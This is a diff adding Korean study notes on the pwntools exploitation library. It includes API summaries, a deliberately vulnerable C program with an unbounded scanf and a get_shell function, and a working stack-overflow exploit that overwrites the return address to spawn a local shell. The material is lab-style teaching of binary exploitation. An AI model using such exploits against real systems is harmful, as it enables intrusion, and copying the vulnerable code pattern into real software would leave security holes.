@@ -113,4 +113,126 @@ gdb를 통해 디버깅할 때 직접 입력할 수 없을 때가 있음 ex. 숫
 
 <img width="1355" alt="image" src="https://user-images.githubusercontent.com/46364778/216357980-af7d3d75-d995-4e60-b652-e03795004faa.png">  
 
----
+---  
+
+## pwntools  
+간단한 프로그램에 대해서는 파이썬으로 공격 페이로드 생성, 파이프를 통해 이를 프로그램에 전달하는 방식으로 익스플로잇 수행 가능  
+익스플로잇이 복잡해진다면? 익스플로잇 스크림트, 바이너리 제작하여 사용  
+자주 사용하게 되는 함수: 정수를 리틀 엔디언의 바이트배열로 바꾸는 패깅 함수, 그 역을 수행하는 언패깅함수 등  
+이들은 집대성 **pwntools** 라는 파이썬 모듈 제작  
+
+* 초기 파이썬 익스플로잇 스크립트  
+```
+#!/usr/bin/env python2
+import socket
+
+# Remote host and port
+RHOST = "127.0.0.1"
+RPORT = 31337
+
+# Make TCP connection
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((RHOST, RPORT))
+
+# Build payload
+payload = ""
+payload += "Socket script"
+payload += "\n"
+
+# Send payload
+s.send(payload)
+
+# Print received data
+data = s.recv(1024)
+print "Received: {0}".format(data)
+```  
+
+* pwntools 이용  
+```
+#!/usr/bin/python3
+from pwn import *
+
+# Make TCP connection
+r = remote("127.0.0.1", 31337)
+
+# Build payload
+payload = ""
+payload += "Socket script"
+payload += "\n"
+
+# Send payload
+r.send(payload)
+
+# Print received data
+data = r.recv(1024)
+print(f"Received: {data}")
+```  
+
+### pwntools API  
+[공식문서](http://docs.pwntools.com/en/latest/)  
+
+* process 함수 : 익스플로잇을 로컬 바이너리를 대상으로 할 때 사용하는 함수; 보통 익스플로잇을 테스트하고 디버깅하기 위해 사용  
+* remote 함수 : 원격 서버를 대상으로 할 때 사용하는 함수; 보통 대상 서버를 실제로 공격하기 위해 사용  
+* send : 데이터를 프로세스에 전송하기 위해 사용(send, sendline, sendafter, sendlineafter...)  
+* recv: 프로세스에서 데이터를 받기 위해 사용  
+recv(n)은 최대 n바이트를 받는 것, 그만큼을 받지 못해도 에러 발생 X  
+recvn(n)은 정확히 n바이트의 데이터를 받지 못하면 계속 기다림  
+* packing & unpacking : 리틀엔디언 바이트 배열 혹은 그 역 ex. p32, p64, u32, u64  
+* interactive : 익스플로잇의 특정 상황에 직접 입력을 주면서 출력을 확인하고 싶을 때, 호출하고 나면 터미널로 프로세스에 데이터를 입력하고, 프로세스의 출력 확인할 수 있음  
+* ELF : elf 헤더 객체를 이용하여 익스플로잇에 사용될 수 있는 각종 정보 활용  
+* context.log : 익스플로잇에 버그발생할 경우 디버깅 돕기, 레벨은 context.log_level로 조절 가능  
+* context.arch : 공격 대상의 아키텍처 정보 받기. 이 값에 따라 몇몇 함수들의 동작이 달라짐(amd64, i386, arm 등)  
+* shellcraft : 제약조건이 존재하는 상황에서는 직접 셀코드 작성하도록  
+[여기](https://docs.pwntools.com/en/stable/shellcraft/amd64.html)에 x86-64 대상으로 생성할 수 있는 여러 종류의 셀 코드를 찾아볼 수 있음  
+* asm: 어셈블 기능. 대상 아키텍처가 중용하므로 미리 지정해야함  
+
+#### 예제코드  
+```
+// Name: rao.c
+// Compile: gcc -o rao rao.c -fno-stack-protector -no-pie
+
+#include <stdio.h>
+#include <unistd.h>
+
+void get_shell() {
+  char *cmd = "/bin/sh";
+  char *args[] = {cmd, NULL};
+  execve(cmd, args, NULL);
+}
+
+int main() {
+  char buf[0x28];
+  printf("Input: ");
+  scanf("%s", buf);
+  return 0;
+}
+```
+
+#### 익스플로잇  
+```
+#!/usr/bin/python3
+#Name: rao.py
+
+from pwn import *          # Import pwntools module
+
+p = process('./rao')       # Spawn process './rao'
+get_shell = 0x4005a7       # Address of get_shell() is 0x4005a7
+
+payload = b"A"*0x30        #|       buf      |  <= "A"*0x30
+payload += b"B"*0x8        #|       SFP      |  <= "B"*0x8
+payload += p64(get_shell)  #| Return address |  <= "\xa7\x05\x40\x00\x00\x00\x00\x00"
+
+p.sendline(payload)        # Send payload to './rao'
+p.interactive()            # Communicate with shell
+```
+
+```
+$ python3 rao.py
+[+] Starting local process './rao': pid 416
+[*] Switching to interactive mode
+$ id
+uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack) ...
+```  
+
+
+
